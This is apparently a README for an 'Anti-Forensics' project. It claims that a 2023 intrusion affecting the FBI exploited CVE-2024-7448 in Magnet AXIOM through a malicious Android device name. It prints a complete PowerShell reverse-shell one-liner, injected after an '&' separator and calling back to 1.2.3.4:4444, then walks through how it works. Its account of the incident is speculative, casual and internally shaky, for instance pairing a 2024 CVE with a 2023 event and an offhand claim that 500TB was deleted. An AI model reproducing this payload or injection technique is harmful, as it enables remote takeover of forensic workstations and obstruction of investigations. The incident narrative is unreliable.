# Anti-Forensics
A 2-step anti forensics system.

# Inspiration
In current popular media a well known figure is Jeffery Epstein, after hearing about this situation and doing some research
I came across a very interesting and concerning intrusion that took place on Sunday, February 12th, 2023 affecting the FBI.
This compelled me to try and recreate a similar system for user privacy security and educational use. 

Here is the official report outlining the attack with a timeline included and some other interesting information.
Timeline begins on page 30.
https://www.justice.gov/epstein/files/DataSet%209/EFTA00173569.pdf

# What I think happened
Based on the official report, I believe CVE-2024-7448 was utilized in this attack through a malicious pre inserted file on an android device.

CVE-2024-7448 is a critical OS command injection vulnerability in Magnet Forensics AXIOM (prior to version 8.0.0.39753)
that allows attackers to gain arbitrary code execution via malicious strings in Android device images.
CVE-2024-7448 is Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection').

For example in windows OS the "&" operator acts as a command seperator, this intructs the OS to sequentially run two or more commands when seperated by the "&" operator.
For example "dir & echo Done" lists files and then immediately prints "Done". 

# Suspected Attack Flow
- Forensics individual plugs android device into Talino workstation.
- They begin parsing data and storing it in a secure location for future analysis.
- AXIOM organizes files automatically for ease of use, utilizing an automated command such as "cmd.exe /c mkdir C:\Evidence\" + [DeviceName]
- Attacker knows this, and changes the DeviceName metadata to this line below, then when AXIOM goes to create a secure copy this is what gets executed.
mkdir C:\Evidence\MyPhone & powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('1.2.3.4',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$x=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($x,0,$x.Length);$s.Flush()};$c.Close()"

1.) powershell -nop -c: Launches PowerShell with No Profile (faster and hides settings) and prepares it to run a Command (the code in quotes).

2.) Net.Sockets.TCPClient('1.2.3.4', 4444): This is the reverse part. It tells the FBI computer to reach out to the attacker's IP address (1.2.3.4) on port 4444.

3.) $s=$c.GetStream(): This creates a "data stream" a two-way pipe for information to travel back and forth.

4.) iex $d: This is the most dangerous part. IEX stands for Invoke-Expression. It takes whatever text the attacker sends from their laptop ($d) and executes it as a live command on the FBI's system.

5.) $s.Write($x...): This takes the result of the command (like the list of files or the username) and "writes" it back across the network to the attacker's screen.


Essentially becuase AXIOM software was parsing the owner's name and simply pasting it into a command string, it didn't realize that the & symbol would tell Windows to stop making the folder and start running this massive block of PowerShell code.
Therefore opening a reverse TCP shell, then the attackers deleted 500TB of data and called it a day lol. 

# More Resources
NATO Cooperative Cyber Defense Centre of Excellence - Digital Intelligence and Evidence Collection in Special Operations

https://ccdcoe.org/uploads/2018/10/BDF_Battlefield_Digital_Forensics_final.pdf
